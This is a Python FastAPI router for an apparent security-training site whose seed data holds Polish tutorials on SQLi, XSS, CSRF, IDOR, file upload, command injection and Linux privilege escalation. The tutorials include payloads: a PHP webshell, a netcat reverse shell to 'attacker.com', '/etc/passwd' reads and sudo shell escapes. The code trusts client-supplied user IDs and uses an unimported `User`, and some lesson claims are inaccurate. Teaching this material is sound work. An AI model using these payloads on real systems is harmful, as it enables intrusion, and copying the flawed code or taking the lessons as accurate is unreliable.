import logging
import json
from datetime import datetime
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from pydantic import BaseModel
from database import get_db
from models.article import Article, ArticleRead, ArticleQuiz, ArticleQuizAttempt
from services.ai_service import generate_json

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/api/articles", tags=["articles"])


class ArticleReadRequest(BaseModel):
    user_id: int
    read_time_seconds: int = None  # optional: time spent reading


@router.get("/")
def get_articles(
    topic_slug: str = None,
    difficulty: int = None,
    limit: int = 50,
    db: Session = Depends(get_db)
):
    """List available articles, optionally filtered."""
    query = db.query(Article).filter(Article.is_active == True)

    if topic_slug:
        query = query.filter(Article.topic_slug == topic_slug)
    if difficulty:
        query = query.filter(Article.difficulty == difficulty)

    articles = query.order_by(Article.created_at.desc()).limit(limit).all()

    return [
        {
            "id": a.id,
            "slug": a.slug,
            "title": a.title,
            "read_time_minutes": a.read_time_minutes,
            "difficulty": a.difficulty,
            "topic_slug": a.topic_slug,
            "created_at": a.created_at.isoformat(),
        }
        for a in articles
    ]


@router.get("/{slug}")
def get_article(slug: str, db: Session = Depends(get_db)):
    """Get article content (markdown) and quiz questions."""
    article = db.query(Article).filter(Article.slug == slug, Article.is_active == True).first()
    if not article:
        raise HTTPException(status_code=404, detail="Article not found")

    quizzes = db.query(ArticleQuiz).filter(ArticleQuiz.article_id == article.id).order_by(ArticleQuiz.question_order).all()

    return {
        "id": article.id,
        "slug": article.slug,
        "title": article.title,
        "content_md": article.content_md,
        "read_time_minutes": article.read_time_minutes,
        "difficulty": article.difficulty,
        "topic_slug": article.topic_slug,
        "quiz_questions": [
            {
                "id": q.id,
                "question": q.question,
                "options": json.loads(q.options) if isinstance(q.options, str) else q.options,
                "explanation": q.explanation,
                "question_order": q.question_order,
            }
            for q in quizzes
        ]
    }


@router.post("/{slug}/read")
def mark_article_read(
    slug: str,
    req: ArticleReadRequest,
    db: Session = Depends(get_db)
):
    """Mark article as read by user."""
    article = db.query(Article).filter(Article.slug == slug, Article.is_active == True).first()
    if not article:
        raise HTTPException(status_code=404, detail="Article not found")

    user = db.query(User).filter(User.id == req.user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    # Check if already read
    existing = db.query(ArticleRead).filter(
        ArticleRead.user_id == req.user_id,
        ArticleRead.article_id == article.id,
        ArticleRead.is_active == True
    ).first()
    if existing:
        # Update read time if provided
        if req.read_time_seconds is not None:
            existing.read_time_seconds = req.read_time_seconds
            db.commit()
        return {"status": "already_read", "id": existing.id}

    read = ArticleRead(
        user_id=req.user_id,
        article_id=article.id,
        read_time_seconds=req.read_time_seconds,
        is_active=True,
    )
    db.add(read)
    db.commit()
    db.refresh(read)

    return {"status": "read", "id": read.id}


class ArticleQuizSubmitRequest(BaseModel):
    user_id: int
    answers: dict  # {quiz_question_id: user_answer_index}


@router.post("/{slug}/quiz/submit")
def submit_article_quiz(
    slug: str,
    req: ArticleQuizSubmitRequest,
    db: Session = Depends(get_db)
):
    """Submit quiz answers for article. Returns score, XP, explanations."""
    article = db.query(Article).filter(Article.slug == slug, Article.is_active == True).first()
    if not article:
        raise HTTPException(status_code=404, detail="Article not found")

    # Get all quiz questions for this article
    quizzes = db.query(ArticleQuiz).filter(ArticleQuiz.article_id == article.id).all()
    quiz_map = {q.id: q for q in quizzes}

    results = []
    correct_count = 0
    total = len(quizzes)

    for qid_str, user_ans in req.answers.items():
        qid = int(qid_str)
        quiz = quiz_map.get(qid)
        if not quiz:
            continue

        is_correct = (user_ans == quiz.correct_index)
        if is_correct:
            correct_count += 1

        # Log attempt
        attempt = ArticleQuizAttempt(
            user_id=req.user_id,
            article_quiz_id=qid,
            user_answer=user_ans,
            is_correct=is_correct,
            is_active=True,
        )
        db.add(attempt)

    db.commit()

    # XP: 20 XP per correct answer (or scale by difficulty)
    xp_awarded = correct_count * 20 * article.difficulty

    # Check if passed (>= 70%)
    passed = (correct_count / total) >= 0.7 if total > 0 else False

    return {
        "correct": correct_count,
        "total": total,
        "score_percent": round((correct_count / total) * 100) if total > 0 else 0,
        "passed": passed,
        "xp_awarded": xp_awarded,
        "details": [
            {
                "question_id": q.id,
                "correct": q.correct_index,
                "explanation": q.explanation,
            }
            for q in quizzes
        ]
    }


def seed_sample_articles(db: Session):
    """Seed database with sample security articles."""
    samples = [
        {
            "slug": "sql-injection-deep-dive",
            "title": "SQL Injection — Complete Guide",
            "content_md": """# SQL Injection

SQL Injection to podatność, która pozwala na wstrzykiwanie własnych poleceń SQL do zapytania aplikacji.

## Jak działa?

Atakujący wpisuje w pole login coś takiego:
```
' OR '1'='1
```
... i omija autoryzację.

## Typy SQLi

- **Error-based:** Wyświetla błędy SQL, ujawniając strukturę
- **Union-based:** Łączy wyniki z innym zapytaniem za pomocą UNION
- **Blind:** Nie ma outputu, ale można wnioskować (time/boolean)

## Zapobieganie

- Prepared statements (parameterized queries)
- Input validation (whitelist)
- Least privilege principle

## Ćwiczenie

Spróbuj SQLi na DVWA — poziom security: low.
""",
            "read_time_minutes": 15,
            "difficulty": 2,
            "topic_slug": "sql-injection",
        },
        {
            "slug": "xss-cross-site-scripting",
            "title": "Cross-Site Scripting (XSS)",
            "content_md": """# XSS — Cross-Site Scripting

XSS pozwala wstrzyknąć JavaScript na stronę, który wykona się w przeglądarce ofiary.

## Typy XSS

1. **Reflected:** Payload od razu zwracany (np. w wynikach wyszukiwania)
2. **Stored:** Zapisany w DB (np. komentarze)
3. **DOM:** Przez manipulację DOM (nie przez serwer)

## Przykład

```html
<script>alert(document.cookie)</script>
```

**Atak:** Kradzież sesji, phishing, deface.

## Obrona

- Input sanitization (DOMPurify)
- Content Security Policy (CSP)
- HttpOnly cookies

## Test

DVWA → XSS (Reflected/Stored)
""",
            "read_time_minutes": 12,
            "difficulty": 2,
            "topic_slug": "xss",
        },
    ]

    # Add more sample articles
    samples.extend([
        {
            "slug": "csrf-demystified",
            "title": "CSRF — Cross-Site Request Forgery",
            "content_md": """# CSRF — Cross-Site Request Forgery

CSRF wymusza na użytkowniku wykonanie niechcianych akcji w aplikacji, w której jest zalogowany.

## Jak to działa?

1. Użytkownik jest zalogowany w banku (session cookie)
2. Otwiera złośliwą stronę
3. Strona wysyła ukryte żądanie przelewu

## Przykład ataku

```html
<img src="https://bank.com/transfer?to=attacker&amount=1000" style="display:none">
```

## Obrona

- **CSRF Token:** Unikalny token w każdym formularzu
- **SameSite Cookies:** `SameSite=Strict` lub `Lax`
- **Re-authentication:** Potwierdzenie wrażliwych akcji hasłem
- **Referer/Origin check:** Sprawdzanie źródła żądania

## Test

DVWA → CSRF (Low/Medium/High)
""",
            "read_time_minutes": 10,
            "difficulty": 3,
            "topic_slug": "csrf",
        },
        {
            "slug": "idor-insecure-direct-object-ref",
            "title": "IDOR — Insecure Direct Object References",
            "content_md": """# IDOR — Insecure Direct Object References

IDOR pozwala na dostęp do zasobów innych użytkowników poprzez manipulację identyfikatorami.

## Przykład

```
GET /api/user/123/profile  ← własny profil
GET /api/user/124/profile  ← cudzy profil (podatność!)
```

## Dlaczego to występuje?

Aplikacja ufa identyfikatorom z frontu bez weryfikacji uprawnień:
```python
def get_user_profile(user_id):
    return db.query(User).get(user_id)  # Brak sprawdzenia czyjącego!
```

## Obrona

- **Authorization check:** Sprawdź czy `current_user.id == requested_user_id`
- **Use UUIDs:** Zamiast prostego `123` użyj `a1b2c3d4-...`
- **Indirect references:** Mapuj ID na tymczasowe tokeny

## Test

DVWA → Insecure CAPTCHA (podatność IDOR)
""",
            "read_time_minutes": 12,
            "difficulty": 3,
            "topic_slug": "idor",
        },
        {
            "slug": "file-upload-attacks",
            "title": "File Upload — Web Shells i RCE",
            "content_md": """# File Upload Vulnerabilities

Przesyłanie plików może prowadzić do przejęcia serwera poprzez upload webshella.

## Zagrożenia

1. **Webshell:** `shell.php` z `system($_GET['cmd'])`
2. **RCE:** Upload `.jsp`/`.asp` jako kod serwerowy
3. **XSS:** Upload `.html` z złośliwym JS
4. **DoS:** Ogromne pliki paraliżują dysk

## Atak — Webshell

```php
<?php system($_GET['cmd']); ?>
```
Upload jako `shell.php` → `http://target.com/uploads/shell.php?cmd=id`

## Obrona

- **File type validation:** Sprawdzaj `Content-Type` i `file extension`
- **Random filenames:** `md5(time()).ext` zamiast oryginalnej nazwy
- **Whitelist extensions:** Tylko `.jpg`, `.png`, `.pdf`
- **Store outside web root:** Lub sprawdzaj zawartość (magic bytes)

## Test

DVWA → File Upload (Low/Medium/High)
""",
            "read_time_minutes": 14,
            "difficulty": 3,
            "topic_slug": "file-upload",
        },
        {
            "slug": "command-injection-guide",
            "title": "Command Injection — Przejęcie serwera",
            "content_md": """# Command Injection

Wstrzykiwanie komend systemowych pozwala na przejęcie serwera poprzez metaznaki powłki.

## Przykład podatności

```php
$ip = $_GET['ip'];
system("ping " . $ip);  // Podatne!
```

Atakujący wysyła: `127.0.0.1; cat /etc/passwd`
Lub: `127.0.0.1 && nc -e /bin/bash attacker.com 4444`

## Metaznaki

| Znak | Działanie |
|------|------------|
| `;` | Separator komend (Windows/Linux) |
| `&&` | AND — następna komenda tylko gdy pierwsza się uda |
| `||` | OR — następna gdy pierwsza się nie uda |
| `|` | Pipe — przekazanie wyjścia |
| `$()` / `` ` `` | Subshell execution |

## Obrona

- **Input validation:** Whitelist dozwolonych wartości
- **Avoid system()/exec():** Użyj API zamiast powłki
- **Escaping:** `escapeshellarg()` w PHP

## Test

DVWA → Command Injection
""",
            "read_time_minutes": 13,
            "difficulty": 3,
            "topic_slug": "command-injection",
        },
        {
            "slug": "privilege-escalation-linux",
            "title": "Privilege Escalation w Linux",
            "content_md": """# Privilege Escalation w Linux

Przejęcie uprawnień `root` — ostatni etap ataku po uzyskaniu dostępu użytkownika.

## Techniki

### 1. SUID Binaries
```bash
find / -perm -4000 2>/dev/null  # Znajdź SUID
./vim -c ':!/bin/sh'          # Escalation przez vim
```

### 2. Cron Jobs
```bash
cat /etc/crontab                 # Sprawdź zadania cron
# Jeśli cron edytowalny → dopisz złośliwe zadanie
```

### 3. Sudo misconfiguration
```bash
sudo -l                          # Sprawdź co można jako sudo
sudo python -c 'import os; os.system("/bin/sh")'
```

### 4. Kernel Exploits
```bash
uname -r                         # Wersja jądra
searchsploit linux kernel 3.13        # Szukaj exploita
```

## Obrona

- **Least Privilege:** Użytkownicy bez zbędnych uprawnień
- **Patch management:** Aktualizuj jądro i pakiety
- **Disable SUID:** Usuń niepotrzebne SUID binaries
- **Monitor cron:** Pilnuj zadań cron i uprawnień

## Przykład CVE

CVE-2021-3156 (Baron Samedit) — sudo heap overflow
""",
            "read_time_minutes": 18,
            "difficulty": 4,
            "topic_slug": "command-injection",
        },
    ])

    added = 0
    for art_data in samples:
        existing = db.query(Article).filter(Article.slug == art_data["slug"]).first()
        if not existing:
            # Add quiz questions (2-3 per article)
            article = Article(
                slug=art_data["slug"],
                title=art_data["title"],
                content_md=art_data["content_md"],
                read_time_minutes=art_data["read_time_minutes"],
                difficulty=art_data["difficulty"],
                topic_slug=art_data["topic_slug"],
                is_active=True,
            )
            db.add(article)
            db.flush()  # get ID

            # Generate quiz based on topic
            quiz_map = {
                "sql-injection": [
                    {"q": "Co to jest SQL Injection?", "opts": ["Atak na serwer DNS", "Wstrzykiwanie SQL", "Atak DDoS", "XSS"], "correct": 1},
                    {"q": "Która metoda zapobiega SQLi?", "opts": ["Escaping", "Prepared statements", "Hashowanie", "Szyfrowanie"], "correct": 1},
                ],
                "xss": [
                    {"q": "Co oznacza XSS?", "opts": ["Cross-Site Scripting", "Extended Security Script", "XML Scripting", "eXtra Server Stack"], "correct": 0},
                    {"q": "Który typ XSS jest zapisywany w bazie?", "opts": ["Reflected", "DOM", "Stored", "All"], "correct": 2},
                ],
                "csrf": [
                    {"q": "Co robi atak CSRF?", "opts": ["Kradnie hasła", "Wymusza akcje w zalogowanej sesji", "Wstrzykuje SQL", "Escaluje uprawnienia"], "correct": 1},
                    {"q": "Który mechanizm chroni przed CSRF?", "opts": ["CORS", "CSRF Token", "Input validation", "Sanitization"], "correct": 1},
                ],
                "idor": [
                    {"q": "Co to IDOR?", "opts": ["SQL Injection", "Dostęp do cudzych zasobów", "XSS attack", "CSRF attack"], "correct": 1},
                    {"q": "Jak chronić się przed IDOR?", "opts": ["UUIDs", "Więcej JS", "Mniej SQL", "CORS"], "correct": 0},
                ],
                "file-upload": [
                    {"q": "Jakie jest największe ryzyko uploadu plików?", "opts": ["DoS", "Webshell/RCE", "XSS", "CSRF"], "correct": 1},
                    {"q": "Jak bronić się przed złośliwym uploadem?", "opts": ["Whitelist extensions", "Blacklist", "Więcej JS", "CORS"], "correct": 0},
                ],
                "command-injection": [
                    {"q": "Co robi command injection?", "opts": ["Wstrzykuje SQL", "Wykonuje komendy systemowe", "Kradnie cookies", "Escaluje uprawnienia"], "correct": 1},
                    {"q": "Który znak to AND w shell?", "opts": [";", "&&", "||", "|"], "correct": 1},
                ],
            }
            quizzes = quiz_map.get(art_data["topic_slug"], [
                {"q": "Pytanie testowe?", "opts": ["A", "B", "C", "D"], "correct": 0}
            ])
            for idx, q in enumerate(quizzes):
                quiz = ArticleQuiz(
                    article_id=article.id,
                    question=q["q"],
                    options=json.dumps(q["opts"]),
                    correct_index=q["correct"],
                    explanation=q.get("explanation", "Sprawdź materiał."),
                    question_order=idx,
                )
                db.add(quiz)

            added += 1

    if added:
        db.commit()
        logger.info(f"Seeded {added} sample articles")
